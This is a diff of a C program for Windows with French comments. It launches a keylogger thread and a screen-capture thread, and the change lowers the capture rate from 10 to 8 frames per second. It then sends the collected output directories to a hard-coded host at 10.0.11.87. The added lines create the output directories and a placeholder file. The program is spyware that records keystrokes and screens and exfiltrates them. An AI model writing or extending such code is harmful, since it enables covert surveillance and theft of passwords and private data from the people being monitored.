@@ -115,7 +115,7 @@ int main(int argc, char *argv[]) {
         printf("Mode par défaut\n");
 
         // Lancer deux threads (start_keylogger et capture)
-        int fps = 10;
+        int fps = 8;
 
         HANDLE thread1 = CreateThread(NULL, 0, start_keylogger_thread, NULL, 0, NULL);
         HANDLE thread2 = CreateThread(NULL, 0, capture_screen_thread, &fps, 0, NULL);
@@ -133,6 +133,25 @@ int main(int argc, char *argv[]) {
         send_dir(output_dir, "10.0.11.87");
         send_dir(output_file_dir, "10.0.11.87");
         printf("sended !");
+        // Création des répertoires (ignore erreur si déjà existant)
+        CreateDirectory(output_file_dir, NULL);
+        CreateDirectory(output_dir, NULL);
+        
+        // Vérifie si le fichier existe
+        FILE *test = fopen(output_file, "r");
+        if (test != NULL) {
+            fclose(test);
+            printf("Le fichier existe déjà. On ne touche pas.\n");
+        } else {
+            FILE *file = fopen(output_file, "w");
+            if (file != NULL) {
+                fprintf(file, "Fichier nouvellement créé.\n");
+                fclose(file);
+                printf("Fichier créé avec succès !\n");
+            } else {
+                printf("Erreur lors de la création du fichier.\n");
+            }
+        }
     }
 
     return 0;
